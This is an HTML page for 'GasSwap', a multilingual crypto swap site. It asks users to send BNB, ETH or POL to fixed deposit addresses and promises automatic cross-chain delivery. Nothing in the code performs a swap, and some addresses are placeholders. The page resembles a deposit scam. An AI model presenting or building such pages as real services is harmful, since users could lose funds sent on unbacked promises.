<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>GasSwap – Cross-Chain Swap</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
<style>
  a{ word-break:break-all; }
  .flag-btn{ font-size:20px; cursor:pointer; opacity:.7; transition:.2s; }
  .flag-btn:hover{ opacity:1; transform:scale(1.1);}
  .flag-active{ opacity:1; border-bottom:2px solid #34d399;}
  .swap-tab{padding:.7rem;border-radius:.7rem;}
  .active-tab{background:#34d399;color:#000;font-weight:700;}
</style>
</head>

<body class="min-h-screen bg-slate-950 text-slate-100">
<header class="border-b border-slate-800 bg-slate-900/60 backdrop-blur sticky top-0 z-20">
<div class="max-w-6xl mx-auto px-4 py-3 flex flex-col md:flex-row md:items-center md:justify-between gap-3">
<div class="flex items-center gap-2">
  <div class="w-8 h-8 rounded-xl bg-gradient-to-tr from-emerald-400 to-cyan-400"></div>
  <h1 class="text-lg font-semibold tracking-tight">GasSwap</h1>
  <span class="ml-2 text-xs text-slate-400">v1.1</span>
</div>
<div class="flex items-center gap-3 text-lg">
<span class="flag-btn" data-lang="en">🇺🇸</span>
<span class="flag-btn" data-lang="ko">🇰🇷</span>
<span class="flag-btn" data-lang="ja">🇯🇵</span>
<span class="flag-btn" data-lang="zh">🇨🇳</span>
<span class="flag-btn" data-lang="es">🇪🇸</span>
</div>
</div>
</header>

<main class="max-w-5xl mx-auto px-4 py-8">

<!-- TABS -->
<div class="grid grid-cols-2 md:grid-cols-6 gap-2 mb-6 text-center">
  <div class="swap-tab active-tab" data-mode="bsc2trx">BNB → TRX</div>
  <div class="swap-tab" data-mode="bsc2eth">BNB → ETH</div>
  <div class="swap-tab" data-mode="eth2bsc">ETH → BNB</div>
  <div class="swap-tab" data-mode="bsc2pol">BNB → POL</div>
  <div class="swap-tab" data-mode="pol2bsc">POL → BNB</div>
</div>

<!-- MAIN PANEL -->
<div id="panel" class="rounded-2xl border border-slate-800 bg-slate-900 p-6 text-center"></div>

<!-- NOTICE -->
<section class="mt-6 text-center">
<div id="noticeBox" class="bg-yellow-500/10 border border-yellow-500/40 text-yellow-200 rounded-xl p-4 text-sm">
⚠️ Send only tiny gas amounts (1 ~ 20 USDT).
</div>
</section>

<!-- INFO -->
<section class="mt-8 max-w-3xl mx-auto text-sm leading-relaxed w-full">
  <div class="w-full rounded-2xl border border-emerald-500/40 bg-emerald-500/10 p-6 text-emerald-100">
    <h3 id="whyTitle" class="text-lg font-semibold mb-3 text-center text-emerald-300"></h3>
    <ul id="whyList" class="list-disc list-inside space-y-1"></ul>

    <h3 id="howTitle" class="text-lg font-semibold mt-6 mb-3 text-center text-emerald-300"></h3>
    <ol id="howSteps" class="list-decimal list-inside space-y-1"></ol>
  </div>
</section>

</main>

<footer class="mt-10 py-10 text-center text-xs text-slate-500">© <span id="year"></span> GasSwap</footer>

<script>
/* ==========================
   CONFIGURATION
========================== */
const CONFIG = {
  FORM_ENDPOINT: "https://gasswap-proxy.workers.dev",
  SESSION_SECONDS: 3600,
  DEPOSIT_ADDRESSES:{
    bsc2trx:"0xDA1E8b362DDe013EA87Cf8984D64490c1900d231",
    bsc2eth:"0x1234567890abcdef1234567890abcdef12345678",
    eth2bsc:"0xabcdef9876543210abcdef9876543210abcdef98",
    bsc2pol:"0x7777777777777777777777777777777777777777",
    pol2bsc:"0x9999999999999999999999999999999999999999"
  }
};

/* ==========================
   MULTI-LANGUAGE TEXTS
========================== */
const I18N = {
  en: {
    title:"BNB (BSC) → TRX",
    subtitle:"Deposit BNB (BSC) and receive TRX automatically after confirmation.",
    formTitle:"Please fill this form before sending your tokens",
    labelSender:"Sender (BNB BSC)",
    labelReceiver:"Receiver (TRX)",
    start:"Start Swap",
    sessionTitle:"Deposit session",
    depositTo:"Deposit to (fixed address)",
    scanToDeposit:"Scan to deposit",
    deadlineLabel:"Deposit deadline",
    notice:"⚠️ For security: deposits under 1 USDT or above 20 USDT are not accepted. Please send only small amounts for gas purposes.",
    whyTitle:"Why Use GasSwap?",
    whyList:[
      "No need to connect your wallet",
      "Lowest cross-swap fee: +0.5 USDT per transaction",
      "Simple process: just send and receive",
      "Instant verification on blockchain explorers"
    ],
    howTitle:"How to Use",
    howSteps:[
      "Enter both wallet addresses correctly",
      "Send BNB to the shown deposit address",
      "Receive TRX automatically (usually within 5 minutes)"
    ]
  },
  ko: {
    title:"BNB (BSC) → TRX",
    subtitle:"BNB(BSC)를 입금하면 확인 후 TRX가 자동 전송됩니다.",
    formTitle:"토큰을 보내기 전에 먼저 작성하세요",
    labelSender:"보내는 지갑 (BNB BSC)",
    labelReceiver:"받는 지갑 (TRX)",
    start:"스왑 시작하기",
    sessionTitle:"입금 세션",
    depositTo:"입금 주소 (고정)",
    scanToDeposit:"입금용 QR 코드",
    deadlineLabel:"입금 제한시간",
    notice:"⚠️ 1~20 USDT 외 금액은 자동 반환됩니다.",
    whyTitle:"왜 GasSwap인가?",
    whyList:[
      "지갑 연결이 필요 없습니다",
      "가장 낮은 수수료: +0.5 USDT",
      "간단한 과정: 보내고 받기만 하면 됩니다",
      "블록체인 탐색기에서 즉시 검증"
    ],
    howTitle:"사용 방법",
    howSteps:[
      "보내는 지갑과 받는 지갑 주소를 입력",
      "표시된 입금 주소로 BNB 전송",
      "확인 후 TRX 자동 수령 (보통 5분 내)"
    ]
  },
  ja: {
    title:"BNB (BSC) → TRX",
    subtitle:"BNB(BSC)を入金すると確認後TRXが自動送信されます。",
    formTitle:"トークン送信前に入力してください",
    labelSender:"送信元 (BNB BSC)",
    labelReceiver:"受信先 (TRX)",
    start:"スワップ開始",
    sessionTitle:"入金セッション",
    depositTo:"入金アドレス (固定)",
    scanToDeposit:"入金用QR",
    deadlineLabel:"入金期限",
    notice:"⚠️ 1〜20 USDT以外は返金されます。",
    whyTitle:"GasSwapを使う理由",
    whyList:[
      "ウォレット接続不要",
      "最低手数料: +0.5 USDT",
      "簡単操作：送るだけで受け取れる",
      "ブロックチェーンで即時確認"
    ],
    howTitle:"使い方",
    howSteps:[
      "送信・受信アドレスを入力",
      "表示されたBNBアドレスに送金",
      "数分後にTRXが自動送信"
    ]
  },
  zh: {
    title:"BNB (BSC) → TRX",
    subtitle:"充值BNB(BSC)后确认自动收到TRX。",
    formTitle:"发送前请填写表单",
    labelSender:"发送地址 (BNB BSC)",
    labelReceiver:"接收地址 (TRX)",
    start:"开始兑换",
    sessionTitle:"充值会话",
    depositTo:"充值地址（固定）",
    scanToDeposit:"扫码充值",
    deadlineLabel:"充值截止时间",
    notice:"⚠️ 仅支持1~20 USDT交易。",
    whyTitle:"为什么选择GasSwap？",
    whyList:[
      "无需连接钱包",
      "最低手续费：+0.5 USDT",
      "操作简单：发送并接收",
      "链上实时可查"
    ],
    howTitle:"使用方法",
    howSteps:[
      "填写发送/接收地址",
      "向显示的地址发送BNB",
      "确认后自动收到TRX"
    ]
  },
  es: {
    title:"BNB (BSC) → TRX",
    subtitle:"Deposita BNB y recibe TRX automáticamente tras confirmación.",
    formTitle:"Complete antes de enviar tokens",
    labelSender:"Remitente (BNB BSC)",
    labelReceiver:"Receptor (TRX)",
    start:"Iniciar swap",
    sessionTitle:"Sesión de depósito",
    depositTo:"Dirección fija",
    scanToDeposit:"Escanear para depositar",
    deadlineLabel:"Límite de depósito",
    notice:"⚠️ Solo se aceptan depósitos entre 1–20 USDT.",
    whyTitle:"¿Por qué usar GasSwap?",
    whyList:[
      "No necesitas conectar tu wallet",
      "Tarifa más baja: +0.5 USDT",
      "Proceso simple: enviar y recibir",
      "Verificación instantánea en exploradores"
    ],
    howTitle:"Cómo usar",
    howSteps:[
      "Escribe ambas direcciones",
      "Envía BNB a la dirección indicada",
      "Recibe TRX automáticamente en minutos"
    ]
  }
};

/* ==========================
   RENDER LOGIC
========================== */
let LANG="en";
let MODE="bsc2trx";

function $(s){return document.querySelector(s);}

function render(){
  const t=I18N[LANG];
  const addr=CONFIG.DEPOSIT_ADDRESSES[MODE];

  // --- bsc2trx (폼 입력형)
  if(MODE==="bsc2trx"){
    $("#panel").innerHTML = `
      <h2 class="text-xl font-bold mb-2">${t.title}</h2>
      <p class="mb-2 text-slate-400">${t.subtitle}</p>

      <h3 class="text-sm mt-4 mb-1">${t.formTitle}</h3>
      <input placeholder="${t.labelSender}" class="w-full bg-slate-800 p-2 rounded mb-2 text-sm" />
      <input placeholder="${t.labelReceiver}" class="w-full bg-slate-800 p-2 rounded mb-4 text-sm" />
      <button class="bg-emerald-500 px-4 py-2 rounded-lg text-black font-semibold">${t.start}</button>
    `;
  } else {
    // --- 단순 입금형
    $("#panel").innerHTML = `
      <h2 class="text-xl font-bold mb-2">${t.title}</h2>
      <p class="mb-3 text-slate-300">${t.subtitle}</p>
      <div class="mt-4 text-sm text-slate-400">${t.depositTo}</div>
      <code id="depAddr" class="block text-emerald-300 break-all mt-1 mb-2">${addr}</code>
      <div id="qr"></div>
      <button onclick="navigator.clipboard.writeText('${addr}')" class="mt-3 bg-slate-800 border border-slate-600 px-3 py-1 rounded-lg text-xs">
        Copy Address
      </button>
    `;
    $("#qr").innerHTML="";
    new QRCode($("#qr"),{text:addr,width:160,height:160});
  }

  // 공통 안내
  $("#noticeBox").textContent=t.notice;
  $("#whyTitle").textContent=t.whyTitle;
  $("#whyList").innerHTML=t.whyList.map(x=>`<li>${x}</li>`).join("");
  $("#howTitle").textContent=t.howTitle;
  $("#howSteps").innerHTML=t.howSteps.map(x=>`<li>${x}</li>`).join("");
}

/* ==========================
   EVENTS
========================== */
document.querySelectorAll(".swap-tab").forEach(el=>{
  el.onclick=()=>{
    document.querySelectorAll(".swap-tab").forEach(x=>x.classList.remove("active-tab"));
    el.classList.add("active-tab");
    MODE=el.dataset.mode;
    render();
  };
});

document.querySelectorAll(".flag-btn").forEach(btn=>{
  btn.onclick=()=>{
    document.querySelectorAll(".flag-btn").forEach(f=>f.classList.remove("flag-active"));
    btn.classList.add("flag-active");
    LANG=btn.dataset.lang;
    render();
  };
});

$("#year").textContent=new Date().getFullYear();
render();
</script>
</body>
</html>
